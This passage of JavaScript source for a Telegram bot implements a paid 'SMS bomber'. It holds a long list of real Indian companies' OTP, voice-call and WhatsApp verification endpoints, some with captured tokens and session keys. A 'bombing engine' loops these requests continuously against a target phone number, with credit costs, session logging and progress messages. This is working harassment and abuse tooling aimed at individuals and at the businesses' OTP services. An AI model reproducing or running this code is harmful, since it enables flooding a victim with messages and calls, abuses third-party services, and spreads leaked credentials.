        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "loginId": "{phone}",
        "type": "MOBILE",
        "version": 2,
        "countryCode": "91"
      },
      "phone_format": "raw"
    },
    {
      "name": "Ola",
      "method": "POST",
      "url": "https://accounts.olacabs.com/api/login",
      "headers": {
        "x-fingerprint-id": "3664542227",
        "csrf-token": "v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://accounts.olacabs.com",
        "referer": "https://accounts.olacabs.com/?serviceType=p2p&when=NOW&utm_source=widget_on_olacabs&pickup_name=Current%20Location&drop_lat=26.7729751&drop_lng=82.1457934&drop_name=Faizabad,%20Uttar%20Pradesh%20India&pickup=&lat=26.7705619&lng=82.151815&cid=687045355.1603884269",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "mobileNumber": "{phone}",
        "dialingCode": "+91",
        "countryCode": "IN",
        "headers": {},
        "verificationId": null,
        "captchaInfo": {
          "gcaptcha": "03AGdBq26mRWBEeBGcFIqhyewjUTfv-Cl4msB5OR3-1NN-IS9kKj3JDAR6MxB0rvNMfhCRqxJccxbUSndGyJvojv2ohDgNe2q8683oSNoD624E20bLqeo6ViMHsgogMvgSmKQUlummiZfr3MUM39UW0T8yJkG1OAEO9-HWTK-wZkEG7bgpxoGFrh1Cw4WwIGPnVZ4-pmulwlAbDCqsgqahK9ngTb8S-EPZu7tFR1srJDE8nF4WhHUR8qsLR1ijem1sNsrdi2-_IihHp3GZqisH1Izt-dmuGW-zSYWyHmZ5EtNcZEk4iA0rxlPpru-n0fxN8RjAH7z4dJJ3vhish9hcyhYYSriKYmiFZzrwO1T72BQrXyx8Xk_zf6YnHwzZms-NEdojlOt87D-t45Fm31IXnTBcTM1-TXZmKCoia6k1kGZmk1arWUMNuSq0SNMh6g42XZ59_I14q_qhM9qF7lMNaSbYOaRQnjlLkA",
          "fingerPrint": 3664542227,
          "storageId": "16038843100270vLePjUljyT3B4eOO8Qvp0VNZ5l"
        }
      },
      "phone_format": "raw"
    },
    {
      "name": "EasyMyTrip",
      "method": "POST",
      "url": "https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/",
      "headers": {
        "accept": "text/plain, */*; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://mybookings.easemytrip.com",
        "referer": "https://mybookings.easemytrip.com/MyBooking/Profile",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "emailph": "{phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "Oyo_1",
      "method": "POST",
      "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
      "headers": {
        "xsrf-token": "vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "text/plain;charset=UTF-8",
        "accept": "*/*",
        "origin": "https://www.oyorooms.com",
        "referer": "https://www.oyorooms.com/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone": "{phone}",
        "country_code": "+91",
        "nod": 4
      },
      "phone_format": "raw"
    },
    {
      "name": "BookMyShow_2",
      "method": "POST",
      "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
      "headers": {
        "accept": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://in.bookmyshow.com",
        "referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={phone}&email=&source=web",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "channel": "phone",
        "subChannel": "sms",
        "details": {
          "phone": "{phone}",
          "origin": "https://in.bookmyshow.com"
        }
      },
      "phone_format": "raw"
    },
    {
      "name": "Zomato_2",
      "method": "POST",
      "url": "https://www.zomato.com/webroutes/auth/login",
      "headers": {
        "x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "*/*",
        "origin": "https://www.zomato.com",
        "referer": "https://www.zomato.com/kanpur",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "country_id": 1,
        "phone": "{phone}",
        "verification_type": "sms",
        "method": "phone"
      },
      "phone_format": "raw"
    },
    {
      "name": "Dominos",
      "method": "POST",
      "url": "https://api.dominos.co.in/loginhandler/forgotpassword",
      "headers": {
        "strict-transport-security": "max-age=1636116872593",
        "access-control-allow-methods": "GET, POST, PATCH, PUT, DELETE, OPTIONS",
        "x-content-type-options": "nosniff",
        "api_key": "d2aeb489bb8df385",
        "ga_client_id": "559252815.1604559839",
        "status": "SUCCESS",
        "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp",
        "userid": "48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
        "x-forwarded-for-requestid": "1604559920579-48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
        "cartid": "1823648622264698",
        "source": "PWA18#upsellC",
        "isloggedin": "false",
        "client_type": "web app-chrome",
        "accesskeyid": "ASIAWMIT2NXASDYLBK5W1604559840",
        "x-frame-options": "mitigate",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "credentials": "[object Object]",
        "deliverytype": "D",
        "authtoken": "ASIAWMIT2NXASDYLBK5W1604559840",
        "access-control-allow-origin": "",
        "accept": "application/json, text/plain, */",
        "sessiontoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8",
        "content-type": "application/json",
        "access-control-allow-headers": "*",
        "storeid": "6585R",
        "ab_test_variant": "New Flow",
        "origin": "https://m.dominos.co.in",
        "referer": "https://m.dominos.co.in/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "lastName": "",
        "mobile": "{phone}",
        "firstName": ""
      },
      "phone_format": "raw"
    },
    {
      "name": "PizzaHut",
      "method": "POST",
      "url": "https://api.pizzahut.io/v1/otp/generate",
      "headers": {
        "x-trace-id": "f222f460-946d-4c59-bb9e-e87db924399c",
        "x-environment-flag": "production",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "recaptcha-token": "03AGdBq25_PaOvx0wAkF3F42ZlMFOK_MV_jF_Q02EKNfJN8lM1f5HSf9d4yxlWDX0Le16IU8rhHV_IUx_CkclsYMviCYTWbvdiiiaUjzTCt52xgED29gx9PW5i0enDH01ne5h3-7hE5d1XFUDaNz33HvJHsupCC1fkOXCHRmkVDOIrKrP-ucgZk8QOOtAgIfe8PJ5JkPH1eLdKVyJb5Sd3lYd8zPZUim1pt59CqOeuK_YD4PQVMt1vBoazROTGEFBfqapC40sBHBK-EbG3CjOCc3y9f7jVinXG8MZ8nhEbfUwqE4b5bGVaV3UAe3isB441XwKqYxVibHbPQwY90oq5O5o1aGB2i6aN7AUo2o5zUYA1uRIVdFZuKlZ7G2k4QusN9seS6HqHv3xESCH-C8Zk3L9QOYiO6pczr9YnkKPX8jl1lt2z4YiTRuyz1oVCFFD8qd8YFj2LMPKqgLNr8DGBPpbLtQhwArKtzQ",
        "content-type": "application/json; charset=utf-8",
        "accept": "/",
        "origin": "https://www.pizzahut.co.in",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone": "+91{phone}"
      },
      "phone_format": "with_plus91"
    },
    {
      "name": "KFC",
      "method": "POST",
      "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
      "headers": {
        "accept": "application/json, text/plain, /",
        "__requestverificationtoken": "x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://online.kfc.co.in",
        "referer": "https://online.kfc.co.in/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phoneNumber": "{phone}",
        "AuthorizedFor": "3",
        "Resend": "false"
      },
      "phone_format": "raw"
    },
    {
      "name": "BurgerKing",
      "method": "POST",
      "url": "https://consumer-apis.burgerking.in/api/v1/user/signUp",
      "headers": {
        "appversion": "1.6",
        "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70",
        "content-type": "application/json",
        "access-control-allow-origin": "",
        "accept": "application/json, text/plain, */",
        "timestamp": "1604561218463",
        "userid": "TEMP6922285271604561176",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "platform": "web",
        "type": "dinein",
        "encryptionkey": "39c9c62a58dc93a3787b7dc7727b289b7583b678d44fc2c17e2887150a11db38",
        "origin": "https://www.burgerking.in",
        "referer": "https://www.burgerking.in/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone_no": "{phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "Dineout",
      "method": "POST",
      "url": "https://www.dineout.co.in/xhrajaxrequest/user_signup",
      "headers": {
        "accept": "application/json, text/javascript, /; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://www.dineout.co.in",
        "referer": "https://www.dineout.co.in/non-veg-special-restaurants-near-me",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={phone}"
      },
      "phone_format": "raw"
    },
    {
      "name": "Oyo_2",
      "method": "POST",
      "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
      "headers": {
        "xsrf-token": "boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "content-type": "text/plain;charset=UTF-8",
        "accept": "/",
        "origin": "https://www.oyorooms.com",
        "referer": "https://www.oyorooms.com/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "phone": "{phone}",
        "country_code": "+91",
        "nod": 4
      },
      "phone_format": "raw"
    },
    {
      "name": "Purplle",
      "method": "GET",
      "url": "https://www.purplle.com/api/account/authorization/send_otp?phone={phone}&action=register",
      "headers": {
        "device_id": "TEC3cjyVJhEFPGsSHw",
        "tracestate": "2174843@nr=0-1-2174843-954632846-ab28153acde8ef8e----1604563013484",
        "traceparent": "00-9c150aeaf03c0d35987fe67bd2403510-ab28153acde8ef8e-01",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIxNzQ4NDMiLCJhcCI6Ijk1NDYzMjg0NiIsImlkIjoiYWIyODE1M2FjZGU4ZWY4ZSIsInRyIjoiOWMxNTBhZWFmMDNjMGQzNTk4N2ZlNjdiZDI0MDM1MTAiLCJ0aSI6MTYwNDU2MzAxMzQ4NH19",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json, text/plain, /",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs",
        "referer": "https://www.purplle.com/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "phone_format": "raw"
    },
    {
      "name": "AngelBroking",
      "method": "POST",
      "url": "https://www.angelbroking.com/form-gateways/oda-form.php",
      "headers": {
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "origin": "https://www.angelbroking.com",
        "content-type": "application/x-www-form-urlencoded",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer": "https://www.angelbroking.com/open-demat-account",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "name=Tsunami+Bomber&mobile={phone}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752"
      },
      "phone_format": "raw"
    },
    {
      "name": "ASVM_Faizabad",
      "method": "POST",
      "url": "http://asvmfaizabad.org/register.php",
      "headers": {
        "cache-control": "max-age=0",
        "upgrade-insecure-requests": "1",
        "Origin": "http://asvmfaizabad.org",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Referer": "http://asvmfaizabad.org/register.php",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"
      },
      "data": {
        "_raw": "id=6778500660&name=TsunamiBomber&mobile={phone}&email=hacker%40gmail.com&address=faizabad&pin=224001&submit=Register"
      },
      "phone_format": "raw"
    }
];

// ===== VOICE APIS =====
const VOICE_APIS = [
    {
      "name": "Tata Capital Voice",
      "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" }),
      "phone_format": "raw"
    },
    {
      "name": "1MG Voice",
      "url": "https://www.1mg.com/auth_api/v6/create_token",
      "method": "POST",
      "headers": {"Content-Type": "application/json; charset=utf-8"},
      "data": (phone) => JSON.stringify({ number: phone, otp_on_call: true }),
      "phone_format": "raw"
    },
    {
      "name": "Swiggy Voice",
      "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ mobile: phone }),
      "phone_format": "raw"
    },
    {
      "name": "Flipkart Voice",
      "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ mobile: phone }),
      "phone_format": "raw"
    },
    {
      "name": "Paytm Voice",
      "url": "https://accounts.paytm.com/signin/voice-otp",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ phone: phone }),
      "phone_format": "raw"
    },
    {
      "name": "Zomato Voice",
      "url": "https://www.zomato.com/php/o2_api_handler.php",
      "method": "POST",
      "headers": {"Content-Type": "application/x-www-form-urlencoded"},
      "data": (phone) => `phone=${phone}&type=voice`,
      "phone_format": "raw"
    },
    {
      "name": "Ola Voice",
      "url": "https://api.olacabs.com/v1/voice-otp",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ phone: phone }),
      "phone_format": "raw"
    },
    {
      "name": "Uber Voice",
      "url": "https://auth.uber.com/v2/voice-otp",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ phone: `+91${phone}` }),
      "phone_format": "raw"
    }
];

// ===== WHATSAPP APIS =====
const WHATSAPP_APIS = [
    {
      "name": "KPN WhatsApp",
      "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
      "method": "POST",
      "headers": { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
      "data": (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } }),
      "phone_format": "raw"
    },
    {
      "name": "Foxy WhatsApp",
      "url": "https://www.foxy.in/api/v2/users/send_otp",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ user: { phone_number: `+91${phone}` }, via: "whatsapp" }),
      "phone_format": "raw"
    },
    {
      "name": "Rappi WhatsApp",
      "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
      "method": "POST",
      "headers": {"Content-Type": "application/json; charset=utf-8"},
      "data": (phone) => JSON.stringify({ country_code: "+91", phone: phone }),
      "phone_format": "raw"
    }
];

// ===== EXTRA APIS =====
const EXTRA_APIS = [
    {
      "name": "Lenskart SMS",
      "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ phoneCode: "+91", telephone: phone }),
      "phone_format": "raw"
    },
    {
      "name": "NoBroker SMS",
      "url": "https://www.nobroker.in/api/v3/account/otp/send",
      "method": "POST",
      "headers": {"Content-Type": "application/x-www-form-urlencoded"},
      "data": (phone) => `phone=${phone}&countryCode=IN`,
      "phone_format": "raw"
    },
    {
      "name": "PharmEasy SMS",
      "url": "https://pharmeasy.in/api/v2/auth/send-otp",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ phone: phone }),
      "phone_format": "raw"
    },
    {
      "name": "Hungama OTP",
      "url": "https://communication.api.hungama.com/v1/communication/otp",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" }),
      "phone_format": "raw"
    },
    {
      "name": "Nykaa",
      "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
      "method": "POST",
      "headers": {"Content-Type": "application/x-www-form-urlencoded"},
      "data": (phone) => `source=sms&mobile_number=${phone}`,
      "phone_format": "raw"
    },
    {
      "name": "Rapido",
      "url": "https://customer.rapido.bike/api/otp",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ mobile: phone }),
      "phone_format": "raw"
    },
    {
      "name": "Dream11",
      "url": "https://www.dream11.com/auth/passwordless/init",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone }),
      "phone_format": "raw"
    },
    {
      "name": "Spinny",
      "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
      "method": "POST",
      "headers": {"Content-Type": "application/json"},
      "data": (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4 }),
      "phone_format": "raw"
    }
];

// ============================================================
// ===== MERGE ALL APIS =====
// ============================================================

const allApis = [...API_CONFIGS, ...VOICE_APIS, ...WHATSAPP_APIS, ...EXTRA_APIS];

const seenUrls = new Set();
const uniqueApis = [];
for (const api of allApis) {
    const urlKey = typeof api.url === 'function' ? `dynamic_${api.name || 'unknown'}` : api.url;
    if (!seenUrls.has(urlKey)) {
        seenUrls.add(urlKey);
        uniqueApis.push(api);
    }
}

for (const api of uniqueApis) {
    if (!api.name) api.name = `api_${uniqueApis.indexOf(api)}`;
    if (!api.data) api.data = null;
}

console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);

// ============================================================
// ===== BOMBING ENGINE =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: API_TIMEOUT,
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        return { status: response.status, success: true };
    } catch (err) {
        if (retryCount < MAX_RETRIES && 
            (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNABORTED')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        return { status: null, success: false };
    }
}

async function processApiBatch(apiBatch, phone) {
    const results = await Promise.allSettled(
        apiBatch.map(api => makeApiCall(api, phone))
    );
    
    let success = 0;
    let smsCount = 0, callCount = 0, whatsappCount = 0;
    
    for (let i = 0; i < results.length; i++) {
        const result = results[i];
        if (result.status === 'fulfilled' && result.value && result.value.success) {
            success++;
            const api = apiBatch[i];
            const name = api?.name || '';
            if (name.toLowerCase().includes('call') || name.toLowerCase().includes('voice')) {
                callCount++;
            } else if (name.toLowerCase().includes('whatsapp')) {
                whatsappCount++;
            } else {
                smsCount++;
            }
        }
    }
    
    return { success, smsCount, callCount, whatsappCount };
}

async function runBomber(chatId, phone, durationMinutes) {
    const protectedList = await db.getProtected();
    if (protectedList.includes(phone)) {
        bot.sendMessage(chatId, '⚠️ This number is PROTECTED by admin.\nBombing not allowed!');
        bombingStatus.set(chatId, false);
        return;
    }

    if (bombingStatus.get(chatId)) {
        bot.sendMessage(chatId, '❌ Bombing already active. Use /stop first.');
        return;
    }
    bombingStatus.set(chatId, true);

    const user = await db.getUser(chatId);
    const isUnlimited = user.daily_unlimited > Date.now() / 1000;

    if (!isUnlimited) {
        const cost = getBombCost(durationMinutes);
        if (!ADMIN_IDS.includes(Number(chatId)) && user.credits < cost) {
            bot.sendMessage(chatId, `❌ Insufficient credits! Need ${cost} credits for ${getDurationText(durationMinutes)}.`);
            bombingStatus.set(chatId, false);
            return;
        }
        await db.updateCredits(chatId, -cost);
    }

    user.total_attacks += 1;
    await user.save();

    const sessionId = `${Date.now()}_${phone}`;
    user.bomb_sessions.push({
        session_id: sessionId,
        phone,
        start_time: Date.now() / 1000,
        duration: durationMinutes,
        is_unlimited: isUnlimited,
    });
    await user.save();

    const durationText = getDurationText(durationMinutes);
    const msg = await bot.sendMessage(
        chatId,
        `⚔️ **BOMBING STARTED**\n📱 Target: \`${phone}\`\n⏱️ Duration: ${durationText}\n🔁 Looping continuously...\n${isUnlimited ? '⭐ UNLIMITED PLAN ACTIVE' : `💳 Cost: ${getBombCost(durationMinutes)} credits`}`,
        { parse_mode: 'Markdown' }
    );

    let smsCount = 0, callCount = 0, whatsappCount = 0, totalSent = 0;
    let lastUpdate = Date.now();
    const updateInterval = 1000;
    const startTime = Date.now() / 1000;
    const endTime = startTime + (durationMinutes === 1440 ? 86400 : durationMinutes * 60);
    const apiList = uniqueApis;
    let cycleCount = 0;

    while (bombingStatus.get(chatId)) {
        if (!isUnlimited && Date.now() / 1000 >= endTime) break;
        checkMemory();

        for (let i = 0; i < apiList.length; i += BATCH_SIZE) {
            if (!bombingStatus.get(chatId)) break;
            if (!isUnlimited && Date.now() / 1000 >= endTime) break;
            
            const batch = apiList.slice(i, i + BATCH_SIZE);
            const result = await processApiBatch(batch, phone);
            
            totalSent += result.success;
            smsCount += result.smsCount;
            callCount += result.callCount;
            whatsappCount += result.whatsappCount;
            
            if (i + BATCH_SIZE < apiList.length) {
                await new Promise(r => setTimeout(r, BATCH_DELAY));
            }
        }
        
        cycleCount++;

        const now = Date.now();
        if (now - lastUpdate >= updateInterval) {
            lastUpdate = now;
            const timeLeft = isUnlimited ? '∞' : Math.floor(endTime - now / 1000);
            const timeLeftText = typeof timeLeft === 'number' ? `${Math.floor(timeLeft/60)}m ${timeLeft%60}s` : '∞';
            try {
                await bot.editMessageText(
                    `⚔️ **BOMBING IN PROGRESS**\n📱 Target: \`${phone}\`\n⏱️ Time Left: ${timeLeftText}\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Cycles: ${cycleCount}\n\n🔴 Use /stop to halt`,
                    { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
                );
            } catch (e) {}
        }

        await new Promise(r => setTimeout(r, 10));
    }

    bombingStatus.set(chatId, false);
    const finalStatus = bombingStatus.get(chatId) === false ? 'STOPPED' : 'COMPLETED';
    await bot.editMessageText(
        `✅ **BOMBING ${finalStatus}**\n📱 Target: \`${phone}\`\n📨 SMS: ${smsCount}\n📞 Calls: ${callCount}\n📱 WA: ${whatsappCount}\n🔄 Total Cycles: ${cycleCount}\n\n🟢 Use /bomb to start again`,
        { chat_id: chatId, message_id: msg.message_id, parse_mode: 'Markdown' }
    );

    const updatedUser = await db.getUser(chatId);
    const session = updatedUser.bomb_sessions.find(s => s.session_id === sessionId);
    if (session) {
        session.end_time = Date.now() / 1000;
        session.total_sent = totalSent;
        session.sms_count = smsCount;
        session.call_count = callCount;
        session.whatsapp_count = whatsappCount;
        session.status = finalStatus;
        session.cycles = cycleCount;
        await updatedUser.save();
    }
}

function getBombCost(minutes) {
    if (minutes === 1440) return 100;
    if (minutes <= 0) return 0;
    if (minutes <= 10) return minutes;
    return 10;
}

function getDurationText(minutes) {
    if (minutes === 1440) return '1 Day (Unlimited)';
    if (minutes < 60) return `${minutes} Minute${minutes > 1 ? 's' : ''}`;
    const h = Math.floor(minutes / 60);
    const m = minutes % 60;
    if (m === 0) return `${h} Hour${h > 1 ? 's' : ''}`;
    return `${h} Hour${h > 1 ? 's' : ''} ${m} Minute${m > 1 ? 's' : ''}`;
}

// ============================================================
// ===== KEYBOARDS =====
// ============================================================

function mainKeyboard() {
    const day = new Date().getDate();
